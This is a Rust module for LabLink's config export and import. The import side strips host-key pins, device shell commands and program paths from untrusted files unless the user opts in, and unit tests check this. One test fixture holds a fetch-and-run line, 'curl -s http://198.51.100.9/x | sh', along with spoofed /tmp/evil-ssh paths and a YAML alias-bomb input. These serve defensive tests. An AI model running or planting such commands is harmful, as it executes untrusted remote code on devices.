//! Portable configuration: `lablink export` / `lablink import`.
//!
//! An export is one YAML document holding a complete LabLink config: the
//! config file (every site), plus devices adopted at runtime and runtime
//! overrides (label, username, monitoring, profile) folded into their sites
//! as ordinary config entries. It never contains private keys, passwords or
//! other secrets: LabLink stores none.
//!
//! Importing is a trust decision, so `import` is conservative:
//! - pinned host-key fingerprints are dropped unless `--trust-pins`;
//! - service-check commands (shell commands LabLink would run on devices)
//!   are dropped unless `--allow-commands`, and each one is listed;
//! - client preferences (the terminal program the GUI launches) and the
//!   OpenSSH binary paths are never imported;
//! - every network that would be actively scanned is listed.

use lablink_core::config::{
    normalize_hostname, normalize_mac, valid_hostname, Config, DeviceConfig, SiteConfig,
    MAX_CONFIG_BYTES,
};
use lablink_core::model::{DeviceDetail, PortState};
use serde::{Deserialize, Serialize};
use serde_yaml_ng::{Mapping, Value};

/// Export format version.
pub const FORMAT: u32 = 1;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ExportDoc {
    pub lablink_export: u32,
    #[serde(default)]
    pub lablink_version: String,
    #[serde(default)]
    pub exported_at: String,
    #[serde(default)]
    pub config: Config,
}

fn push_unique(v: &mut Vec<String>, s: String) {
    if !v.contains(&s) {
        v.push(s);
    }
}

/// Build an export from the config file and (when the daemon answered) the
/// daemon's device details (every site).
pub fn build(
    config: &Config,
    devices: Option<&[DeviceDetail]>,
    include_fingerprints: bool,
    now_ms: u64,
) -> Result<ExportDoc, String> {
    let mut cfg = config.clone();
    for d in devices.unwrap_or_default() {
        let pins: Vec<String> = d
            .pinned_keys
            .iter()
            .map(|k| k.fingerprint.clone())
            .collect();
        let Some(site) = cfg.site_mut(&d.status.site) else {
            continue; // site removed from the config since
        };
        if d.configured {
            let Some(c) = site
                .devices
                .iter_mut()
                .find(|c| c.name.eq_ignore_ascii_case(&d.status.name))
            else {
                continue;
            };
            let o = &d.overrides;
            if let Some(l) = &o.label {
                c.label = Some(l.clone());
            }
            if let Some(u) = &o.username {
                c.usernames.retain(|x| x != u);
                c.usernames.insert(0, u.clone());
            }
            if let Some(m) = o.monitoring {
                c.monitor = m;
            }
            if let Some(p) = o.profile {
                if p.uses_ssh() || !c.ssh {
                    c.profile = Some(p);
                }
            }
            for f in pins {
                push_unique(&mut c.host_key_fingerprints, f);
            }
        } else {
            let mut c = DeviceConfig::named(&d.status.name);
            c.label = d.status.label.clone();
            c.usernames = d.status.username.iter().cloned().collect();
            c.ssh = d.status.ssh_port != PortState::Disabled;
            c.auth_check = c.ssh;
            c.monitor = d.status.monitoring;
            c.profile = d.status.profile;
            c.notes = d.notes.clone();
            c.host_key_fingerprints = pins;
            // Identity signals, minus any another device of the site claims.
            let claimed_hosts: Vec<String> = site
                .devices
                .iter()
                .flat_map(|x| x.hostnames.iter().map(|h| normalize_hostname(h)))
                .collect();
            for h in &d.learned_hostnames {
                let n = normalize_hostname(h);
                if valid_hostname(&n) && !claimed_hosts.contains(&n) {
                    push_unique(&mut c.hostnames, n);
                }
            }
            let claimed_macs: Vec<String> = site
                .devices
                .iter()
                .flat_map(|x| x.normalized_macs())
                .collect();
            for m in &d.macs {
                if let Some(n) = normalize_mac(m).filter(|n| !claimed_macs.contains(n)) {
                    push_unique(&mut c.macs, n);
                }
            }
            site.devices.push(c);
        }
    }
    if !include_fingerprints {
        for s in &mut cfg.sites {
            for d in &mut s.devices {
                d.host_key_fingerprints.clear();
                // Remote access requires pins; without them it is dropped.
                d.remote = None;
            }
        }
    }
    cfg.validate()
        .map_err(|e| format!("cannot export: the combined configuration is invalid: {e}"))?;
    Ok(ExportDoc {
        lablink_export: FORMAT,
        lablink_version: lablink_core::VERSION.into(),
        exported_at: format!("{}Z", crate::configfile::utc_stamp(now_ms)),
        config: cfg,
    })
}

impl ExportDoc {
    pub fn to_yaml(&self) -> String {
        let cfg: Value = serde_yaml_ng::from_str(&self.config.to_yaml()).unwrap_or(Value::Null);
        let mut m = Mapping::new();
        m.insert("lablink_export".into(), Value::from(self.lablink_export));
        m.insert(
            "lablink_version".into(),
            self.lablink_version.clone().into(),
        );
        m.insert("exported_at".into(), self.exported_at.clone().into());
        m.insert(
            "config".into(),
            if cfg.is_null() {
                Value::Mapping(Mapping::new())
            } else {
                cfg
            },
        );
        format!(
            "# LabLink export. Contains no private keys, passwords or secrets.\n# Import with: lablink import <file>   (host-key pins are dropped unless --trust-pins)\n{}",
            serde_yaml_ng::to_string(&Value::Mapping(m)).unwrap_or_default()
        )
    }
}

/// Parse and validate an export file.
pub fn parse(text: &str) -> Result<ExportDoc, String> {
    if text.len() as u64 > MAX_CONFIG_BYTES {
        return Err(format!(
            "the file is larger than {MAX_CONFIG_BYTES} bytes; not a LabLink export"
        ));
    }
    let doc: ExportDoc =
        serde_yaml_ng::from_str(text).map_err(|e| format!("not a LabLink export: {e}"))?;
    if doc.lablink_export != FORMAT {
        return Err(format!(
            "unsupported export format {} (this LabLink reads format {FORMAT})",
            doc.lablink_export
        ));
    }
    doc.config
        .validate()
        .map_err(|e| format!("the exported configuration is invalid: {e}"))?;
    Ok(doc)
}

#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct ImportOptions {
    /// Keep pinned host-key fingerprints from the file.
    pub trust_pins: bool,
    /// Keep service-check commands (shell commands run on devices).
    pub allow_commands: bool,
    /// Replace existing networks/devices/checks with the same name, site
    /// names, and the daemon/ssh settings.
    pub replace: bool,
}

#[derive(Debug, Clone, PartialEq)]
pub struct ImportPlan {
    pub config: Config,
    /// What changes, one line each.
    pub changes: Vec<String>,
    /// What was left alone and why.
    pub skipped: Vec<String>,
    /// Fingerprints dropped because `trust_pins` was not set.
    pub dropped_pins: usize,
    /// Fingerprints that will be pinned (only with `trust_pins`):
    /// `(site/device, fingerprint)`.
    pub kept_pins: Vec<(String, String)>,
    /// Service-check commands dropped because `allow_commands` was not set:
    /// `(site/device, service, command)`.
    pub dropped_commands: Vec<(String, String, String)>,
    /// Service-check commands that will run on devices (only with
    /// `allow_commands`): `(site/device, service, command)`.
    pub kept_commands: Vec<(String, String, String)>,
    /// Networks the merged config would actively scan: `(site, cidr)`.
    pub scanned_networks: Vec<(String, String)>,
}

fn same_name(a: &DeviceConfig, b: &DeviceConfig) -> bool {
    std::iter::once(&a.name)
        .chain(&a.aliases)
        .any(|n| b.answers_to(n))
}

/// Merge an export into the current config. Nothing is written here.
pub fn plan(current: &Config, doc: &ExportDoc, opts: ImportOptions) -> Result<ImportPlan, String> {
    let mut cfg = current.clone();
    let mut changes = Vec::new();
    let mut skipped = Vec::new();
    let mut dropped_pins = 0;
    let mut kept_pins = Vec::new();
    let mut dropped_commands = Vec::new();
    let mut kept_commands = Vec::new();

    for src in &doc.config.sites {
        if cfg.site(&src.id).is_none() {
            if cfg
                .sites
                .iter()
                .any(|s| s.name.trim().eq_ignore_ascii_case(src.name.trim()))
            {
                skipped.push(format!(
                    "site {} ('{}'): another site already has this name",
                    src.id, src.name
                ));
                continue;
            }
            let mut site = SiteConfig::new(&src.id, &src.name);
            site.auto_detect = src.auto_detect;
            cfg.sites.push(site);
            changes.push(format!("site {} ('{}'): added", src.id, src.name));
        }
        let si = cfg
            .sites
            .iter()
            .position(|s| s.id.eq_ignore_ascii_case(&src.id))
            .expect("present");
        let sid = cfg.sites[si].id.clone();
        if cfg.sites[si].name != src.name || cfg.sites[si].auto_detect != src.auto_detect {
            if opts.replace {
                cfg.sites[si].name = src.name.clone();
                cfg.sites[si].auto_detect = src.auto_detect;
                changes.push(format!(
                    "site {sid}: name and auto-detection taken from the file"
                ));
            } else {
                skipped.push(format!(
                    "site {sid}: kept your name '{}' and auto-detection (use --replace)",
                    cfg.sites[si].name
                ));
            }
        }

        for n in &src.networks {
            let site = &mut cfg.sites[si];
            match site
                .networks
                .iter()
                .position(|x| x.name.eq_ignore_ascii_case(&n.name))
            {
                Some(i) if site.networks[i] == *n => {}
                Some(i) if opts.replace => {
                    changes.push(format!(
                        "network {sid}/{}: replaced ({} -> {})",
                        n.name, site.networks[i].cidr, n.cidr
                    ));
                    site.networks[i] = n.clone();
                }
                Some(_) => skipped.push(format!(
                    "network {sid}/{}: a different network with this name exists (use --replace)",
                    n.name
                )),
                None if site.networks.iter().any(|x| x.cidr == n.cidr) => skipped.push(format!(
                    "network {sid}/{} ({}): already allowed under another name",
                    n.name, n.cidr
                )),
                None => {
                    changes.push(format!(
                        "network {sid}/{} ({}{}): added",
                        n.name,
                        n.cidr,
                        if n.active_scan { ", ACTIVE SCAN" } else { "" }
                    ));
                    site.networks.push(n.clone());
                }
            }
        }

        for d in &src.devices {
            let mut d = d.clone();
            let id = format!("{sid}/{}", d.name);
            if opts.trust_pins {
                for f in &d.host_key_fingerprints {
                    kept_pins.push((id.clone(), f.clone()));
                }
            } else {
                dropped_pins += d.host_key_fingerprints.len();
                d.host_key_fingerprints.clear();
                // Remote access requires pins: it is only imported with them.
                if d.remote.take().is_some() {
                    skipped.push(format!(
                        "device {id}: remote access not imported (it needs the pinned fingerprints; use --trust-pins)"
                    ));
                }
            }
            for svc in &d.services {
                let entry = (id.clone(), svc.name.clone(), svc.command.clone());
                if opts.allow_commands {
                    kept_commands.push(entry);
                } else {
                    dropped_commands.push(entry);
                }
            }
            if !opts.allow_commands {
                d.services.clear();
            }
            let site = &mut cfg.sites[si];
            match site.devices.iter().position(|x| same_name(x, &d)) {
                Some(i) if site.devices[i] == d => {}
                Some(i) if opts.replace => {
                    changes.push(format!("device {id}: replaced"));
                    site.devices[i] = d;
                }
                Some(i) => skipped.push(format!(
                    "device {id}: already defined as '{}' (use --replace)",
                    site.devices[i].name
                )),
                None => {
                    changes.push(format!("device {id}: added"));
                    site.devices.push(d);
                }
            }
        }

        for (dev, specs) in &src.checks {
            let site = &mut cfg.sites[si];
            match site.checks.get(dev) {
                Some(cur) if cur == specs => {}
                Some(_) if !opts.replace => skipped.push(format!(
                    "checks for {sid}/{dev}: different checks exist (use --replace)"
                )),
                _ => {
                    changes.push(format!("checks for {sid}/{dev}: {} check(s)", specs.len()));
                    site.checks.insert(dev.clone(), specs.clone());
                }
            }
        }
    }

    // OpenSSH binary paths are local facts and decide what LabLink executes:
    // they are never taken from a file.
    let mut file_ssh = doc.config.ssh.clone();
    file_ssh.binary = cfg.ssh.binary.clone();
    file_ssh.keyscan_binary = cfg.ssh.keyscan_binary.clone();
    file_ssh.keygen_binary = cfg.ssh.keygen_binary.clone();
    if doc.config.daemon != cfg.daemon || file_ssh != cfg.ssh {
        if opts.replace {
            cfg.daemon = doc.config.daemon.clone();
            cfg.ssh = file_ssh;
            changes.push("daemon and ssh settings: replaced (OpenSSH program paths kept)".into());
        } else {
            skipped.push(
                "daemon and ssh settings: kept yours (use --replace to take the file's)".into(),
            );
        }
    }
    if !doc.config.preferences.is_default() {
        skipped
            .push("preferences: never imported (they choose programs this computer runs)".into());
    }

    cfg.validate()
        .map_err(|e| format!("the merged configuration would be invalid: {e}"))?;
    let scanned_networks = cfg
        .networks()
        .filter(|(_, n)| n.active_scan)
        .map(|(s, n)| (s.id.clone(), n.cidr.clone()))
        .collect();
    Ok(ImportPlan {
        config: cfg,
        changes,
        skipped,
        dropped_pins,
        kept_pins,
        dropped_commands,
        kept_commands,
        scanned_networks,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use lablink_core::model::*;

    const FP: &str = "SHA256:47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU";

    fn detail(name: &str, configured: bool) -> DeviceDetail {
        DeviceDetail {
            schema_version: 1,
            status: DeviceStatus {
                name: name.into(),
                id: String::new(),
                site: "default".into(),
                site_name: "Default".into(),
                site_state: lablink_core::site::SiteState::Active,
                label: Some("Bench PC".into()),
                color: Color::Green,
                ip: Some("192.168.50.7".into()),
                discovery: DiscoveryState::Located,
                network: NetworkState::Online,
                ssh_port: PortState::Open,
                ssh_auth: AuthState::Ok,
                identity: IdentityState::Verified,
                latency_ms: None,
                last_seen_ms: None,
                username: Some("ops".into()),
                interface: None,
                network_name: None,
                via: None,
                monitoring: true,
                reasons: vec![],
                services: vec![],
                profile: Some(lablink_core::profile::Profile::GpuWorkstation),
                capabilities: vec![],
            },
            configured,
            aliases: vec![],
            usernames: vec![],
            active_username: None,
            ssh_host: name.into(),
            ssh_port: 22,
            hostnames: vec![],
            learned_hostnames: vec!["bench-pc".into()],
            mdns_names: vec![],
            macs: vec!["aa:bb:cc:00:11:22".into()],
            pinned_keys: vec![KeyView {
                key_type: "ssh-ed25519".into(),
                fingerprint: FP.into(),
                source: Some("trust".into()),
            }],
            observed_keys: vec![],
            expected_ips: vec![],
            addresses: vec![],
            identity_signal: None,
            consecutive_failures: 0,
            last_error: None,
            notes: None,
            recent_events: vec![],
            overrides: OverridesView::default(),
        }
    }

    fn dev<'a>(c: &'a Config, name: &str) -> &'a DeviceConfig {
        c.find_devices(name)[0].1
    }

    fn base() -> Config {
        Config::parse(
            "networks:\n  - name: lab\n    cidr: 192.168.50.0/24\n    active_scan: true\ndevices:\n  - name: jetson-a\n    usernames: [ops]\n",
            "t",
        )
        .unwrap()
    }

    #[test]
    fn export_folds_in_adopted_devices_and_overrides_and_round_trips() {
        let mut jetson_a = detail("jetson-a", true);
        jetson_a.overrides.label = Some("Jetson".into());
        jetson_a.overrides.username = Some("admin".into());
        jetson_a.overrides.monitoring = Some(false);
        jetson_a.pinned_keys.clear();
        let devs = [jetson_a, detail("bench", false)];
        let doc = build(&base(), Some(&devs), true, 0).unwrap();
        let o = dev(&doc.config, "jetson-a");
        assert_eq!(o.label.as_deref(), Some("Jetson"));
        assert_eq!(o.usernames, ["admin", "ops"]);
        assert!(!o.monitor);
        let b = dev(&doc.config, "bench");
        assert_eq!(b.usernames, ["ops"]);
        assert_eq!(b.hostnames, ["bench-pc"]);
        assert_eq!(b.macs, ["aa:bb:cc:00:11:22"]);
        assert_eq!(b.host_key_fingerprints, [FP]);
        assert_eq!(
            b.profile,
            Some(lablink_core::profile::Profile::GpuWorkstation)
        );
        let text = doc.to_yaml();
        assert!(text.starts_with("# LabLink export."));
        assert_eq!(parse(&text).unwrap(), doc);
        // Without fingerprints.
        let doc = build(&base(), Some(&devs), false, 0).unwrap();
        assert!(doc
            .config
            .devices()
            .all(|(_, d)| d.host_key_fingerprints.is_empty()));
        // Config only (daemon down).
        assert_eq!(build(&base(), None, true, 0).unwrap().config, base());
    }

    fn with_remote() -> Config {
        Config::parse(
            &format!("devices:\n  - name: box\n    host_key_fingerprints: [\"{FP}\"]\n    remote:\n      tailscale:\n        address: box.tail-ex.ts.net\n        tailnet: tail-ex.ts.net\n"),
            "t",
        )
        .unwrap()
    }

    #[test]
    fn remote_access_travels_only_with_its_pins() {
        let doc = build(&with_remote(), None, true, 0).unwrap();
        assert!(dev(&doc.config, "box").remote.is_some());
        let without = build(&with_remote(), None, false, 0).unwrap();
        assert!(
            dev(&without.config, "box").remote.is_none(),
            "export without pins stays valid"
        );
        // Import without --trust-pins drops remote access and says so.
        let p = plan(&Config::default(), &doc, ImportOptions::default()).unwrap();
        assert!(dev(&p.config, "box").remote.is_none());
        assert!(
            p.skipped
                .iter()
                .any(|s| s.contains("remote access not imported")),
            "{:?}",
            p.skipped
        );
        p.config.validate().unwrap();
        let p = plan(
            &Config::default(),
            &doc,
            ImportOptions {
                trust_pins: true,
                ..Default::default()
            },
        )
        .unwrap();
        assert!(dev(&p.config, "box").remote.is_some());
    }

    #[test]
    fn import_merges_drops_pins_by_default_and_respects_conflicts() {
        let devs = [detail("bench", false)];
        let doc = build(&base(), Some(&devs), true, 0).unwrap();
        // Into an empty config.
        let p = plan(&Config::default(), &doc, ImportOptions::default()).unwrap();
        assert_eq!(p.dropped_pins, 1);
        assert!(p.kept_pins.is_empty());
        assert!(p
            .config
            .devices()
            .all(|(_, d)| d.host_key_fingerprints.is_empty()));
        assert_eq!(p.config.network_count(), 1);
        assert!(p
            .changes
            .iter()
            .any(|c| c == "site default ('Default'): added"));
        assert!(p.changes.iter().any(|c| c == "device default/bench: added"));
        assert_eq!(
            p.scanned_networks,
            [("default".to_string(), "192.168.50.0/24".to_string())]
        );
        // Keeping pins is explicit.
        let p = plan(
            &Config::default(),
            &doc,
            ImportOptions {
                trust_pins: true,
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.kept_pins, [("default/bench".to_string(), FP.to_string())]);
        // Conflicts are skipped unless --replace.
        let mut cur = base();
        cur.sites[0].devices[0].usernames = vec!["other".into()];
        cur.sites[0].networks[0].cidr = "192.168.60.0/24".into();
        let p = plan(&cur, &doc, ImportOptions::default()).unwrap();
        assert!(
            p.skipped
                .iter()
                .any(|s| s.starts_with("device default/jetson-a")),
            "{:?}",
            p.skipped
        );
        assert!(
            p.skipped
                .iter()
                .any(|s| s.starts_with("network default/lab")),
            "{:?}",
            p.skipped
        );
        assert_eq!(dev(&p.config, "jetson-a").usernames, ["other"]);
        let p = plan(
            &cur,
            &doc,
            ImportOptions {
                replace: true,
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(dev(&p.config, "jetson-a").usernames, ["ops"]);
        assert_eq!(p.config.sites[0].networks[0].cidr, "192.168.50.0/24");
        // Importing the same thing twice changes nothing.
        let p1 = plan(&Config::default(), &doc, ImportOptions::default()).unwrap();
        let p2 = plan(&p1.config, &doc, ImportOptions::default()).unwrap();
        assert!(p2.changes.is_empty(), "{:?}", p2.changes);
    }

    #[test]
    fn bad_files_are_rejected() {
        assert!(parse("hello: 1\n").is_err());
        assert!(parse("lablink_export: 9\n")
            .unwrap_err()
            .contains("unsupported"));
        assert!(parse("lablink_export: 1\nconfig:\n  networks:\n    - name: x\n      cidr: 8.8.8.0/24\n      active_scan: true\n")
            .unwrap_err()
            .contains("invalid"));
        // Secret-looking keys are not part of the schema at all.
        assert!(parse("lablink_export: 1\nconfig:\n  ssh:\n    password: hunter2\n").is_err());
        // Oversized files are refused before parsing.
        let big = format!(
            "lablink_export: 1\n# {}\n",
            "x".repeat(MAX_CONFIG_BYTES as usize)
        );
        assert!(parse(&big).unwrap_err().contains("larger than"));
        // Alias bombs ("billion laughs") fail fast instead of expanding.
        let mut bomb = String::from("lablink_export: 1\na: &a [x,x,x,x,x,x,x,x,x,x]\n");
        for i in 0..9 {
            let prev = if i == 0 {
                "a".to_string()
            } else {
                format!("b{}", i - 1)
            };
            bomb.push_str(&format!("b{i}: &b{i} [*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev},*{prev}]\n"));
        }
        let t0 = std::time::Instant::now();
        assert!(parse(&bomb).is_err());
        assert!(t0.elapsed() < std::time::Duration::from_secs(5));
    }

    #[test]
    fn import_never_takes_commands_preferences_or_program_paths_silently() {
        let file = "lablink_export: 1\nconfig:\n  ssh:\n    binary: /tmp/evil-ssh\n    connect_timeout_s: 9\n  preferences:\n    terminal: /tmp/evil-term\n  sites:\n    - id: site-beta\n      name: Site Beta\n      networks:\n        - name: lab\n          cidr: 10.20.30.0/24\n          active_scan: true\n      devices:\n        - name: jetson-b\n          services:\n            - name: probe\n              command: \"curl -s http://198.51.100.9/x | sh\"\n";
        let doc = parse(file).unwrap();
        let p = plan(&Config::default(), &doc, ImportOptions::default()).unwrap();
        assert_eq!(p.dropped_commands.len(), 1, "{p:?}");
        assert!(p.config.devices().all(|(_, d)| d.services.is_empty()));
        assert_eq!(p.config.preferences.terminal, None);
        assert!(p.skipped.iter().any(|s| s.starts_with("preferences")));
        assert_eq!(p.config.ssh.binary, "ssh");
        assert!(
            p.changes.iter().any(|c| c.contains("ACTIVE SCAN")),
            "{:?}",
            p.changes
        );
        assert_eq!(
            p.scanned_networks,
            [("site-beta".to_string(), "10.20.30.0/24".to_string())]
        );
        // Explicit opt-in keeps the command and lists it; --replace takes the
        // ssh settings but still never the program paths.
        let p = plan(
            &Config::default(),
            &doc,
            ImportOptions {
                allow_commands: true,
                replace: true,
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.kept_commands.len(), 1);
        assert_eq!(p.config.ssh.binary, "ssh");
        assert_eq!(p.config.ssh.connect_timeout_s, 9);
        assert_eq!(p.config.preferences.terminal, None);
    }

    #[test]
    fn import_merges_sites_by_id() {
        let mine = Config::parse("sites:\n  - id: site-alpha\n    name: Site Alpha\n    devices:\n      - name: jetson\n", "t").unwrap();
        let file = "lablink_export: 1\nconfig:\n  sites:\n    - id: site-alpha\n      name: Lab A\n      devices:\n        - name: robot-a\n          ssh: false\n    - id: site-beta\n      name: Site Beta\n      devices:\n        - name: jetson\n";
        let p = plan(&mine, &parse(file).unwrap(), ImportOptions::default()).unwrap();
        assert_eq!(p.config.sites.len(), 2);
        assert_eq!(
            p.config.sites[0].name, "Site Alpha",
            "name kept without --replace"
        );
        assert_eq!(
            p.config.find_devices("jetson").len(),
            2,
            "same name, two sites"
        );
        assert!(p
            .changes
            .iter()
            .any(|c| c == "device site-alpha/robot-a: added"));
        assert!(p
            .changes
            .iter()
            .any(|c| c == "device site-beta/jetson: added"));
    }
}
